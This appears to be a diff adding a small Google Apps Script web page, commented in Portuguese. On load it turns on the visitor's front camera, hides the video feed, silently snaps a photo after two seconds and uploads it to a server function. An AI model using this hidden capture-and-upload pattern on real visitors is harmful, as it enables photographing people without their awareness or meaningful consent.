@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <style>
+      video {
+    display: none; 
+  }
+      body { margin: 0; overflow: hidden; background: black; display: flex; justify-content: center; align-items: center; height: 100vh; }
+      video { width: 100%; height: 100%; object-fit: cover; }
+    </style>
+  </head>
+  <body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+      //variaveis foram criadas para conseguir juntar com as tags video e canvas
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+
+      // 1. Liga a câmera assim que abre o app
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })//solicitando acesso a câmera
+        .then(stream => { 
+          video.srcObject = stream; 
+          
+          // 2. Agenda a foto automática após 2 segundos (2000ms)
+          setTimeout(tirarFotoAutomatica, 2000); 
+        });
+
+      function tirarFotoAutomatica() { //puxando a função foto automática
+        const context = canvas.getContext('2d');//ativa o modo de pintura do canvas
+        canvas.width = video.videoWidth;//ajusta os valores de width e height do canvas  e do video para serem iguais
+        canvas.height = video.videoHeight;
+        
+        // Desenha o frame atual do vídeo no canvas
+        context.drawImage(video, 0, 0);
+        
+        // Transforma em dados e envia para o seu arquivo .gs
+        const dataUrl = canvas.toDataURL('image/jpeg');//converte uma imagem do canvas em string texto(grande quantidade de texto)
+        
+        google.script.run //cria uma ponte de comunicação entre o navegador e o arquivo gs
+          .withSuccessHandler(() => {//caso seja sucesso,exibe um alert
+             alert("espontaneamente! ");
+          })
+          .salvarFoto(dataUrl); //Executa a função do lado do servidor enviando a foto em string 
+      }
+    </script>
+  </body>
+</html>
